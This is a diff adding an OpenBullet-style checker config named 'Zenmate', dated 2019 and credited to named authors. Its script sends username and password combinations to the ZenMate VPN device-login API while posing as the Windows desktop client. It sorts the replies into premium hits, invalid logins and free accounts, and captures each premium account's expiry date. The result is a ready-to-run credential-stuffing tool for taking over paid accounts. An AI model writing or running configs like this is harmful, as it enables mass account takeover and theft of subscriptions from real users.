@@ -1,0 +1,41 @@
+[SETTINGS]
+{
+  "Name": "Zenmate",
+  "SuggestedBots": 110,
+  "LastModified": "2019-04-03T03:40:10.1625796-04:00",
+  "AdditionalInfo": "Updated by Ari, originally written by othmane jawadi.",
+  "Author": "Ari",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.zcdn.de/v2/devices" 
+  CONTENT "auth_method=user&auth_id=<USER>&auth_secret=<PASS>&install_id=f9834131-0a1a-4ae7-958d-5dcc70e94bf8&os_name=Windows&os_ver=Microsoft%20Windows%20NT%2010.0.17134.0&client_name=Windows&client_ver=3.5.0.20&client_env=windows10&locations_scope=true&client_type=desktop&show_premium=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: RestSharp/105.2.3.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"is_premium\":true" 
+  KEYCHAIN Failure OR 
+    KEY "\"Invalid email or password\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"is_premium\":false" 
+PARSE "<SOURCE>" LR "\"premium_expires_at\":\"" "\",\"partner_id\"" -> CAP "expires_on" 
